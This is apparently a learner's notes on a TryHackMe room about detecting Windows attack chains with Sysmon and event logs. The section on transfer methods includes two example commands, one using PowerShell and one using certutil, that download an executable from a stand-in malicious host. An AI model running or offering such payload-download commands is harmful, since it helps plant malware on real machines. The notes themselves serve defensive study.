# 🛡️ Windows Threat Detection 2 — TryHackMe

## 📅 Day 107 - 365 Days of Cybersecurity

## ✅ Status: Completed

---

## 🧠 Overview

In this room, I advanced my skills in **Windows threat detection**, focusing on identifying complete attack chains through **event correlation, behavioral analysis, and timeline reconstruction**.

The emphasis is on understanding how attackers operate within a system and detecting their activity using **Windows Event Logs and Sysmon telemetry**.

This represents a shift from simple detection to a more **investigation-driven SOC approach**.

---

## 🎯 Learning Objectives

* Detect advanced threats using Windows logs and Sysmon
* Correlate multiple events to identify attack chains
* Analyze attacker techniques and behavior
* Perform timeline-based investigations
* Identify Indicators of Compromise (IoCs)

---

## 🪟 Key Log Sources

### 🔹 Windows Security Logs

Provide visibility into:

* Authentication activity
* Account changes
* Privilege usage

---

### 🔹 Sysmon Logs

Provide detailed telemetry:

* **Event ID 1** → Process creation
* **Event ID 3** → Network connections
* **Event ID 11** → File creation
* **Event ID 13** → Registry changes

📌 SOC Insight:
Sysmon is critical for detecting **advanced attacker behavior and post-exploitation activity**.

---

## 🔎 Core Detection Concepts

### 🔹 Event Correlation

Detection is based on combining multiple related events.

📌 Example:

* Sysmon Event 1 → Suspicious process execution
* Sysmon Event 3 → External connection

➡️ Indicates potential **malware execution with C2 communication**

---

### 🔹 Behavioral Analysis

Focus on identifying anomalies rather than relying only on signatures:

* Unusual login patterns
* Suspicious processes
* Unexpected network activity

---

### 🔹 Parent-Child Process Relationships

📌 Example:

* `winword.exe` → `powershell.exe`
* `powershell.exe` → external connection

➡️ Likely **malicious macro execution**

---

### 🔹 Living-off-the-Land (LOLBins)

Attackers abuse legitimate Windows tools:

* `powershell.exe`
* `cmd.exe`
* `wmic.exe`

📌 Detection:

* Suspicious command-line arguments
* Execution in abnormal contexts

---

## 🔄 Common Transfer Methods

Attackers often need to **transfer files** (payloads, tools, exfiltration). Detecting these methods is key in post-exploitation.

### 🔹 Common Techniques:

* **HTTP/HTTPS Downloads**

  * Using PowerShell:

    ```
    powershell -c "Invoke-WebRequest http://malicious.com/file.exe -OutFile file.exe"
    ```

* **BITS (Background Intelligent Transfer Service)**

  * Legit Windows service abused for stealthy downloads

* **Certutil**

  * Built-in tool used to download files:

    ```
    certutil -urlcache -split -f http://malicious.com/file.exe file.exe
    ```

* **SMB / Network Shares**

  * File transfers across internal network

* **FTP / TFTP**

  * Legacy protocols still used by attackers

---

### 🔍 Detection Indicators:

* Suspicious outbound connections (Sysmon Event 3)
* Unusual command-line usage (Sysmon Event 1)
* File creation after network activity (Sysmon Event 11)
* Use of legitimate tools for downloading files (LOLBins)

📌 SOC Insight:
These techniques are commonly used to **drop malware or move laterally** within the network.

---

### 🔗 Example Attack Chain:

1. User opens malicious document
2. `winword.exe` spawns `powershell.exe`
3. PowerShell downloads payload (HTTP)
4. File created on disk (Sysmon 11)
5. Payload executed
6. Outbound connection established (Sysmon 3)

➡️ Full compromise workflow

---

## 🚨 Indicators of Compromise (IoCs)

* Suspicious process creation (Sysmon 1 / Event 4688)
* Abnormal parent-child relationships
* Unexpected outbound connections (Sysmon 3)
* Unauthorized file creation (Sysmon 11)
* Registry persistence (Sysmon 13)
* Use of tools like PowerShell, certutil for downloads

---

## 🛡️ Detection Scenarios

### 🔹 Initial Compromise

* Office process spawning PowerShell

---

### 🔹 Malware Download

* PowerShell / certutil making external requests

---

### 🔹 Persistence

* Registry modifications (Sysmon 13)

---

### 🔹 Command & Control (C2)

* Repeated outbound connections

---

## 🔎 SOC Investigation Workflow

1. Identify suspicious activity
2. Correlate events
3. Build timeline
4. Identify attacker techniques
5. Assess impact

---

## 🛠️ Tools & Technologies

* Windows Event Viewer
* Sysmon
* SIEM (Splunk / ELK)
* EDR solutions

---

## 🧠 Key Takeaways

* Attackers frequently use legitimate tools for file transfer
* Detecting transfer methods is key in post-exploitation
* Event correlation reveals full attack chains
* Sysmon provides critical visibility into these activities
* Behavioral detection is essential for modern threats

---

## 📌 Final Thoughts

This room helped me:

* Understand how attackers move files within a system
* Detect file transfer techniques used in real attacks
* Correlate events to identify full compromise chains
* Strengthen my investigation mindset as a SOC Analyst

This represents a strong step toward real-world threat detection and incident response.
